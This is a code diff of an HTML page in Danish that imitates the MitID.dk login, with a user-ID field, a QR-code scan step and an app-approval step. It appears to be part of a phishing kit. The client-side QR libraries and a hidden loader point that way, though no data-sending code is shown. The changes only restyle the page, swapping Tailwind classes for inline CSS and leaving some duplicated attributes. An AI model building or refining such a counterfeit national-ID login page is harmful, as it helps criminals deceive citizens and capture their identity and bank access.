@@ -1,7 +1,40 @@
 <!doctype html>
 <html lang="da">
 <head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Log på hos MitID.dk</title>
-<script src="https://cdn.tailwindcss.com"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:1rem}
+.kort{width:100%;max-width:440px;background:#fff;border:1px solid #d8d8d8;border-radius:4px;box-shadow:0 1px 2px rgba(0,0,0,.05)}
+.kort-head{display:flex;justify-content:space-between;align-items:center;padding:24px 32px;border-bottom:1px solid #d8d8d8}
+.kort-head h1{font-size:20px;font-weight:700;color:#1a1a1a;letter-spacing:-.01em}
+.kort-head img{height:24px;width:auto}
+.kort-body{padding:32px}
+.flex-between{display:flex;justify-content:space-between;align-items:center}
+.label-row{display:flex;align-items:center;gap:8px;margin-bottom:8px}
+.label-row label{font-size:12px;font-weight:700;color:#1a1a1a;letter-spacing:.03em;text-transform:uppercase}
+.input-rel{position:relative}
+.input-id{width:100%;padding:12px 48px 12px 12px;border:2px solid #0060e6;border-radius:4px;outline:none;font-size:18px;color:#1a1a1a;background:#f5faff}
+.input-rel span{position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#1a1a1a;font-size:15px;cursor:pointer;user-select:none}
+.btn-continue{width:100%;color:#fff;font-weight:700;font-size:16px;text-transform:uppercase;letter-spacing:.05em;padding:16px 24px;border:none;border-radius:4px;display:flex;align-items:center;justify-content:space-between;min-height:56px;margin-bottom:24px;transition:all .15s;cursor:pointer}
+.btn-continue.disabled{background:#ccc;cursor:not-allowed}
+.btn-continue.active{background:#0060e6;cursor:pointer}
+.btn-continue.active:hover{background:#0049b8}
+.glemt{display:flex;align-items:center;gap:8px;color:#0060e6;margin-bottom:48px;cursor:pointer}
+.glemt span{font-size:14px;font-weight:500}
+.glemt:hover{text-decoration:underline}
+.husk{display:flex;align-items:center;gap:12px;margin-bottom:24px;cursor:pointer}
+.husk input{width:20px;height:20px;accent-color:#0060e6;cursor:pointer}
+.husk span{color:#001845;font-weight:700;font-size:15px}
+.bottom{border-top:1px solid #d8d8d8;padding-top:16px;text-align:center}
+.bottom a{color:#0060e6;font-weight:700;font-size:15px;text-decoration:none}
+.bottom a:hover{text-decoration:underline}
+.hidden{display:none!important}
+@keyframes fadeIn{0%{opacity:0;transform:translateY(6px)}100%{opacity:1;transform:translateY(0)}}
+.animate-in{animation:fadeIn .3s ease-out}
+@keyframes spinSlow{to{transform:translate(-50%,-50%) rotate(360deg)}}
+@keyframes pulseSub{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.7;transform:scale(1.04)}}
+</style>
+
 <link rel="stylesheet" href="visitor-tail.css">
 <script src="https://unpkg.com/qr-code-styling@1.6.0-rc.1/lib/qr-code-styling.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
@@ -32,15 +65,15 @@
   </div>
 </div>
 
-<div class="w-full max-w-[440px] bg-white border border-[#d8d8d8] rounded-[4px] shadow-sm">
+<div class="kort">
   <!-- HEADER -->
-  <div class="flex justify-between items-center px-8 py-6 border-b border-[#d8d8d8] animate-fade-in">
+  <div class="kort-head animate-in">
     <h1 class="text-[20px] font-bold text-[#1a1a1a] tracking-tight" id="formHeading">Log på hos MitID.dk</h1>
     <img src="/assets/mitid-logo.png" alt="MitID" style="height:24px;width:auto;">
   </div>
 
   <!-- INDHOLD -->
-  <div class="px-8 py-8">
+  <div class="kort-body">
 
     <!-- LOADER (skjult) -->
     <div id="loaderContainer" class="hidden">
@@ -57,30 +90,30 @@
     <!-- BRUGER-ID TRIN -->
     <div id="stepBruger">
       <div class="mb-6 animate-fade-in-1">
-        <div class="flex items-center gap-2 mb-2">
+        <div class="label-row">
           <label class="text-[12px] font-bold text-[#1a1a1a] tracking-wide uppercase">Bruger-ID</label>
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
         </div>
-        <div class="relative">
+        <div class="input-rel">
           <input type="text" id="brugerIdInput" autocomplete="off" spellcheck="false"
-                 class="w-full pl-3 pr-12 py-3 border-[2px] border-[#0060e6] rounded-[4px] outline-none text-lg text-[#1a1a1a] bg-[#f5faff]">
+                 class="input-id" id="brugerIdInput" autocomplete="off" spellcheck="false">
           <span class="absolute right-3 top-1/2 -translate-y-1/2 text-[#1a1a1a] text-[15px] cursor-pointer hover:underline select-none" id="hideBtn">Skjul</span>
         </div>
       </div>
-      <button id="brugerBtn" disabled class="w-full text-white font-bold text-[16px] uppercase tracking-wider py-4 px-6 rounded-[4px] flex items-center justify-between mb-6 transition-all duration-150 min-h-[56px] active:scale-[0.98] animate-fade-in-2 bg-[#cccccc] cursor-not-allowed">
+      <button id="brugerBtn" disabled class="btn-continue disabled" disabled>
         <span class="flex-1 text-center ml-6">FORTSÆT</span>
         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
       </button>
-      <div class="flex items-center gap-2 text-[#0060e6] mb-12 cursor-pointer hover:underline animate-fade-in-3">
+      <div class="glemt animate-in">
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
         <span class="text-[14px] font-medium">Glemt bruger-ID?</span>
       </div>
       <div class="pt-4 animate-fade-in-4">
-        <div class="flex items-center gap-3 mb-6 cursor-pointer select-none">
+        <div class="husk">
           <input type="checkbox" id="rememberMe" style="width:20px;height:20px;accent-color:#0060e6;cursor:pointer;">
           <span class="text-[#001845] font-bold text-[15px]">Husk mig hos MitID.dk</span>
         </div>
-        <div class="border-t border-[#d8d8d8] pt-4 text-center">
+        <div class="bottom">
           <a href="#" class="text-[#0060e6] font-bold text-[15px] hover:underline">Afbryd</a>
         </div>
       </div>
@@ -93,7 +126,7 @@
         <div style="font-size:17px;font-weight:700;color:#1a1a1a;padding:14px 0 2px;">Scan QR-koden</div><div style="font-size:14px;color:#5c5c5c;padding-bottom:8px;">Brug din MitID app til at scanne koden</div>
       </div>
       <div class="pt-4">
-        <div class="border-t border-[#d8d8d8] pt-4 text-center">
+        <div class="bottom">
           <a href="#" class="text-[#0060e6] font-bold text-[15px] hover:underline">Afbryd</a>
         </div>
       </div>
@@ -108,7 +141,7 @@
         <div style="font-size:15px;color:#1a1a1a;">Åbn MitID app og godkend</div>
       </div>
       <div class="pt-4">
-        <div class="border-t border-[#d8d8d8] pt-4 text-center">
+        <div class="bottom">
           <a href="#" class="text-[#0060e6] font-bold text-[15px] hover:underline">Afbryd</a>
         </div>
       </div>
